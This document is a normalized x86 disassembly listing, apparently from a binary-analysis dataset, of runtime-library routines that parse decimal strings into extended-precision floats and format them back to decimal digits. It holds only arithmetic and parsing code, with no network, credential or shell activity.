mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_4192e8
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
push esi
xor esi esi
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
inc esi
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x64 ] ecx
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x6c ] ecx
cmp [ ebp + 0x24 ] ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_40515f
mov [ eax ] 0x16
call sub_40510d
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_4056bc
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
push ebx
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_419994 ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
lea ecx [ eax - 0x31 ]
mov [ ebp - 0x58 ] esi
cmp cl 0x8
jbe r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
mov [ ebp - 0x5c ] esi
cmp al 0x9
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_41a6fc
mov eax [ ebp - 0x64 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x68 ] edx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
sub al 0x64
cmp al 0x1
ja r-xdata
cmp [ ebp - 0x5c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x78 ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
pop ebx
mov [ ebp - 0x6c ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x7c ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
lea ebx [ ecx + eax ]
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x7c ]
xor edx edx
mov edx [ ebp - 0x32 ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
movzx eax [ ebx + 0xa ]
mov esi eax
xor esi [ ebp - 0x32 ]
mov ecx 0x7fff
and edx ecx
and eax ecx
and esi 0x8000
mov edi 0x7fff
lea ecx [ eax + edx ]
mov [ ebp - 0x70 ] esi
movzx ecx cx
cmp dx di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp ax di
jae r-xdata
mov edi 0xbffd
cmp cx di
ja r-xdata
mov esi 0x3fbf
cmp cx si
ja r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp ax si
jne r-xdata
inc ecx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x68 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc ecx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
add edi 0x2
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov edx [ ebp - 0x58 ]
add eax eax
mov [ ebp - 0x64 ] edx
test edx edx
jle r-xdata
add ecx 0xc002
test cx cx
jle r-xdata
mov [ ebp - 0x4c ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add ecx 0xffff
test cx cx
jns r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x4c ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
cmp [ ebp - 0x2c ] ax
ja r-xdata
mov eax ecx
neg eax
movzx esi ax
add ecx esi
test cx cx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov edx esi
add esi esi
or esi eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add ecx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test cx cx
jg r-xdata
mov eax [ ebp - 0x60 ]
mov edx [ ebp - 0x5c ]
movzx edx [ edx ]
movzx eax [ eax ]
and [ ebp - 0x4c ] 0x0
imul eax edx
mov edx [ edi - 0x4 ]
lea esi [ edx + eax ]
cmp esi edx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x2c ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl edx 0x1f
shr eax 0x1
or eax edx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp cx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or ecx [ ebp - 0x70 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] cx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x70 ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov edx 0xffff
cmp [ ebp - 0x22 ] dx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc ecx
jmp r-xdata
sub_4199c4
mov edi edi
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
movzx eax [ ebp + 0x10 ]
movzx edx [ ebp + 0x10 ]
mov ecx 0x8000
and eax ecx
push ebx
mov ebx [ ebp + 0x1c ]
mov [ ebp - 0x60 ] eax
lea eax [ ecx - 0x1 ]
push esi
and edx eax
cmp [ ebp - 0x60 ] 0x0
push edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x30 ] 0xcccccccc
mov [ ebp - 0x2c ] 0xcccccccc
mov [ ebp - 0x28 ] 0x3ffbcccc
mov [ ebp - 0x74 ] 0x1
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx ax
jne r-xdata
test esi esi
jne r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
test dx dx
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
mov eax esi
shr eax 0x18
shr ebx 0x8
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx eax ax
xor ecx ecx
mov [ ebp - 0x20 ] cx
movsx ebx ax
mov ecx rw-data
sub ecx 0x60
neg ebx
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x68 ] ecx
je r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
inc eax
mov [ ebx ] ax
mov eax 0x80000000
cmp ecx eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
mov edx 0x3fff
mov eax 0x7fff
cmp cx dx
jb r-xdata
test ebx ebx
jns r-xdata
test ecx 0x40000000
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp - 0x60 ] cx
mov [ ebx ] ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x3001
mov [ ebx + 0x5 ] 0x0
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x64 ]
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edx ] ax
je r-xdata
mov ebx [ ebp - 0x26 ]
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x26 ]
xor ebx ecx
and ecx eax
and edx eax
and ebx 0x8000
lea esi [ edx + ecx ]
mov [ ebp - 0x5c ] ebx
movzx esi si
cmp cx ax
jae r-xdata
je r-xdata
mov eax rw-data
sub eax 0x60
neg ebx
mov [ ebp - 0x68 ] eax
test ebx ebx
xor edx edx
cmp [ ebp - 0x60 ] dx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4056bc
leave
retn
cmp edi 0x15
jle r-xdata
cwde
add edi eax
test edi edi
jg r-xdata
xor eax eax
test bx bx
sete al
and [ ebp - 0x1c ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x20 ] 0x0
cmp dx ax
jae r-xdata
add [ ebp - 0x68 ] 0x54
mov ecx ebx
sar ebx 0x3
and ecx 0x7
je r-xdata
cmp ecx eax
jne r-xdata
cmp ecx 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_403f64
add esp 0xc
test eax eax
jne r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
sub esi 0x3ffe
xor eax eax
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x44 ] 0x8
push 0x15
pop edi
xor eax eax
mov [ edx ] ax
mov eax 0x8000
cmp [ ebp - 0x60 ] ax
mov [ edx + 0x3 ] 0x3001
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x5 ] 0x0
jmp r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
xor esi esi
imul ecx ecx 0xc
add ecx [ ebp - 0x68 ]
mov eax ecx
mov [ ebp - 0x44 ] ecx
mov ecx 0x8000
cmp [ eax ] cx
jb r-xdata
push r--data
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_4050bb
mov [ ebx + 0x3 ] 0x6
mov eax [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add ebx ebx
or ebx eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec [ ebp - 0x44 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jns r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
movzx ecx [ eax + 0xa ]
mov edx ecx
xor edx [ ebp - 0x16 ]
mov esi 0x7fff
and edx 0x8000
mov [ ebp - 0x58 ] edx
mov edx [ ebp - 0x16 ]
and edx esi
and ecx esi
lea esi [ ecx + edx ]
movzx edi si
mov esi 0x7fff
cmp dx si
jae r-xdata
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x44 ] eax
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x1 ]
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
xor eax eax
cmp cx ax
jne r-xdata
xor eax eax
xor eax eax
xor esi esi
cmp [ ebp - 0x58 ] si
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp cx si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_403f64
add esp 0xc
test eax eax
jne r-xdata
mov al [ ebx - 0x1 ]
sub ebx 0x2
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr ebx 0x1
or ebx eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] eax
test esi esi
jg r-xdata
cmp dx ax
jne r-xdata
inc esi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] esi
